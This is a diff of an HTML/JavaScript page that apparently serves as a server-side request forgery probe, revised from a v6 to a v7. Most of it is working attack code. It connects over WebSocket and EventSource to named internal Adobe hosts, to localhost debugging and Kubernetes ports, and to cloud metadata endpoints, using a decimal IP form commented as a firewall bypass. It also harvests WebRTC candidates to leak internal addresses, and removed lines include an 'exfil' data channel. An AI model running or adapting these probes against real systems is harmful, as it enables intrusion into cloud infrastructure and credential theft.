@@ -1,139 +1,88 @@
 <html><body>
-<h2>SSRF Probe v6 - WebSocket</h2>
+<h2>v7 WS+SDP</h2>
 <pre id="r"></pre>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
-L('UA: '+navigator.userAgent);
-L('Cores: '+navigator.hardwareConcurrency);
 
-// WebSocket probe with timeout and data capture
-function wsProbe(url,label,timeout){
-  timeout=timeout||3000;
+function ws(url,label,to){
+  to=to||1500;
   return new Promise(function(ok){
-    var t=Date.now();
-    var msgs=[];
-    var done=false;
-    function fin(s){if(!done){done=true;var dt=Date.now()-t;L(label+': '+s+' '+dt+'ms');if(msgs.length)msgs.forEach(function(m){L('  MSG: '+m.substring(0,300));});ok();}}
+    var t=Date.now();var done=false;
+    function fin(s){if(!done){done=true;L(label+': '+s+' '+(Date.now()-t)+'ms');ok();}}
     try{
-      var ws=new WebSocket(url);
-      ws.onopen=function(){
-        L(label+': OPEN '+(Date.now()-t)+'ms');
-        // Try sending data
-        try{ws.send('{"id":1,"method":"Browser.getVersion"}');}catch(e){}
-        try{ws.send('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n');}catch(e){}
-      };
-      ws.onmessage=function(e){
-        var d=typeof e.data==='string'?e.data:'[binary '+e.data.size+'B]';
-        msgs.push(d);
-        L(label+' MSG: '+d.substring(0,300));
-      };
-      ws.onerror=function(){fin('ERR');};
-      ws.onclose=function(e){fin('CLOSE code='+e.code+' reason="'+e.reason+'"');};
-      setTimeout(function(){if(!done){try{ws.close();}catch(e){}fin('TIMEOUT');}},timeout);
-    }catch(e){fin('CATCH: '+e.message);}
+      var w=new WebSocket(url);
+      w.onopen=function(){L(label+': OPEN '+(Date.now()-t)+'ms');try{w.send('{"id":1,"method":"Browser.getVersion"}');}catch(e){}};
+      w.onmessage=function(e){L(label+' MSG: '+(typeof e.data==='string'?e.data.substring(0,400):'[bin]'));};
+      w.onerror=function(){fin('ERR');};
+      w.onclose=function(e){fin('CLOSE c='+e.code);};
+      setTimeout(function(){if(!done){try{w.close();}catch(e){}fin('TIMEOUT');}},to);
+    }catch(e){fin(e.message);}
   });
 }
 
 (async function(){
-  // 1. Chrome DevTools Protocol - various ports
-  L('\n== CDP WebSocket ==');
-  // First get the debug endpoint list via fetch
-  L('Checking CDP endpoints...');
-  var cdpPorts=[9222,9229,9333,9515,9223,9224,9225];
-  for(var i=0;i<cdpPorts.length;i++){
-    var p=cdpPorts[i];
-    try{
-      var r=await fetch('http://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
-      var t=await r.text();
-      L('CDP:'+p+' version: '+t.substring(0,300));
-    }catch(e){
-      L('CDP:'+p+' fetch: '+e.name);
-    }
-    // Also try WSS
-    try{
-      var r2=await fetch('https://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
-      var t2=await r2.text();
-      L('CDP:'+p+' (wss) version: '+t2.substring(0,300));
-    }catch(e){}
-  }
+  L('UA: '+navigator.userAgent);
+  L('Cores: '+navigator.hardwareConcurrency);
 
-  // 2. WebSocket to localhost various ports
-  L('\n== WS localhost ==');
-  await wsProbe('ws://127.0.0.1:9222/','ws-cdp-9222',2000);
-  await wsProbe('ws://127.0.0.1:9229/','ws-node-9229',2000);
-  await wsProbe('ws://127.0.0.1:80/','ws-lo-80',2000);
-  await wsProbe('ws://127.0.0.1:8080/','ws-lo-8080',2000);
-  await wsProbe('ws://127.0.0.1:3000/','ws-lo-3000',2000);
-  await wsProbe('ws://127.0.0.1:6379/','ws-redis',2000);
-  await wsProbe('ws://127.0.0.1:27017/','ws-mongo',2000);
+  // WSS to Adobe internal (most interesting - might bypass HTTP proxy)
+  L('\n== WSS Adobe ==');
+  await ws('wss://senseicore-ue1.adobe.io/','sensei');
+  await ws('wss://dc-argus.adobe.io/','argus');
+  await ws('wss://platform-cs-jpn3.adobe.io/','platcs');
+  await ws('wss://dc-genai-content-platform-v2-jpn3.adobe.io/','genai');
+  await ws('wss://dc-graph-proxy.adobe.io/','graphprx');
 
-  // 3. WSS (secure WebSocket) - might bypass HTTP proxy!
-  L('\n== WSS (secure) ==');
-  await wsProbe('wss://127.0.0.1:443/','wss-lo-443',2000);
-  await wsProbe('wss://127.0.0.1:8443/','wss-lo-8443',2000);
-  await wsProbe('wss://127.0.0.1:9222/','wss-cdp-9222',2000);
+  // WSS localhost
+  L('\n== WSS local ==');
+  await ws('wss://127.0.0.1:443/','lo443');
+  await ws('wss://127.0.0.1:8443/','lo8443');
+  await ws('wss://127.0.0.1:9222/','cdp9222');
 
-  // 4. WSS to internal Adobe services
-  L('\n== WSS Adobe Internal ==');
-  await wsProbe('wss://senseicore-ue1.adobe.io/','wss-sensei',2000);
-  await wsProbe('wss://dc-argus.adobe.io/','wss-argus',2000);
-  await wsProbe('wss://platform-cs-jpn3.adobe.io/','wss-platcs',2000);
-  await wsProbe('wss://dc-genai-content-platform-v2-jpn3.adobe.io/','wss-genai',2000);
-  await wsProbe('wss://dc-genai-autocomplete-an1.adobe.io/','wss-autocomplete',2000);
-
-  // 5. WS to IMDS (decimal to bypass WAF)
+  // WS IMDS
   L('\n== WS IMDS ==');
-  await wsProbe('ws://2852039166/','ws-imds-dec',2000);
-  await wsProbe('ws://169.254.169.254/','ws-imds',2000);
-  await wsProbe('ws://169.254.170.2/','ws-ecs',2000);
+  await ws('ws://2852039166/','imds-dec');
+  await ws('ws://169.254.169.254/','imds');
+  await ws('ws://169.254.170.2/','ecs');
 
-  // 6. WS to internal hostnames
-  L('\n== WS Internal ==');
-  await wsProbe('ws://kubernetes.default.svc/','ws-k8s',2000);
-  await wsProbe('ws://localhost:10250/','ws-kubelet',2000);
-  await wsProbe('ws://localhost:2379/','ws-etcd',2000);
+  // WS internal hostnames
+  L('\n== WS internal ==');
+  await ws('ws://127.0.0.1:10250/','kubelet');
+  await ws('ws://127.0.0.1:2379/','etcd');
+  await ws('ws://127.0.0.1:6443/','k8s-api');
 
-  // 7. EventSource (SSE) - another protocol that might bypass
+  // EventSource
   L('\n== EventSource ==');
-  try{
-    var es=new EventSource('http://169.254.169.254/latest/meta-data/');
-    es.onopen=function(){L('ES IMDS: OPEN');};
-    es.onerror=function(){L('ES IMDS: ERR');es.close();};
-    es.onmessage=function(e){L('ES IMDS MSG: '+e.data);};
-  }catch(e){L('ES IMDS: '+e.message);}
-  try{
-    var es2=new EventSource('http://2852039166/latest/meta-data/');
-    es2.onopen=function(){L('ES dec: OPEN');};
-    es2.onerror=function(){L('ES dec: ERR');es2.close();};
-    es2.onmessage=function(e){L('ES dec MSG: '+e.data);};
-  }catch(e){L('ES dec: '+e.message);}
+  await new Promise(function(ok){
+    try{var es=new EventSource('http://2852039166/');es.onerror=function(){L('ES dec: ERR');es.close();ok();};es.onopen=function(){L('ES dec: OPEN');};setTimeout(function(){es.close();ok();},1500);}catch(e){L('ES: '+e.message);ok();}
+  });
+  await new Promise(function(ok){
+    try{var es=new EventSource('http://127.0.0.1:9222/json');es.onerror=function(){L('ES cdp: ERR');es.close();ok();};es.onopen=function(){L('ES cdp: OPEN');};es.onmessage=function(e){L('ES cdp MSG: '+e.data.substring(0,200));};setTimeout(function(){es.close();ok();},1500);}catch(e){L('ES cdp: '+e.message);ok();}
+  });
 
-  // 8. Try RTCDataChannel for data exfil
-  L('\n== DataChannel ==');
+  // SDP full dump
+  L('\n== SDP ==');
   try{
     var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    var dc=pc.createDataChannel('exfil');
-    dc.onopen=function(){L('DC OPEN');dc.send('test');};
-    dc.onmessage=function(e){L('DC MSG: '+e.data);};
-    dc.onerror=function(e){L('DC ERR');};
+    pc.createDataChannel('d');
     var offer=await pc.createOffer();
     await pc.setLocalDescription(offer);
-    L('SDP: '+offer.sdp.substring(0,200));
-    // Extract IPs from SDP
-    var ips=offer.sdp.match(/c=IN IP[46] (\S+)/g);
-    if(ips)L('SDP IPs: '+JSON.stringify(ips));
-    // Extract candidates from SDP
-    var cands=offer.sdp.match(/a=candidate:.+/g);
-    if(cands)cands.forEach(function(c){L('SDP cand: '+c);});
-  }catch(e){L('DC err: '+e.message);}
+    var sdp=offer.sdp;
+    var lines=sdp.split('\n');
+    for(var i=0;i<lines.length;i++){
+      var l=lines[i].trim();
+      if(l.indexOf('c=')===0||l.indexOf('a=candidate')===0||l.indexOf('a=ice')===0||l.indexOf('a=fingerprint')===0||l.indexOf('a=setup')===0||l.indexOf('o=')===0){
+        L(l);
+      }
+    }
+  }catch(e){L('SDP: '+e.message);}
 
-  L('\n== DONE v6 ==');
+  // Busy wait at END to keep page alive
+  L('\n== Waiting 5s ==');
+  var start=Date.now();
+  while(Date.now()-start<5000){}
+  L('Done. t='+(Date.now()-start)+'ms');
+  L('\n== DONE v7 ==');
 })();
-
-// Busy wait 8s
-var start=Date.now();
-while(Date.now()-start<8000){}
-L('Wait done');
 </script>
 </body></html>
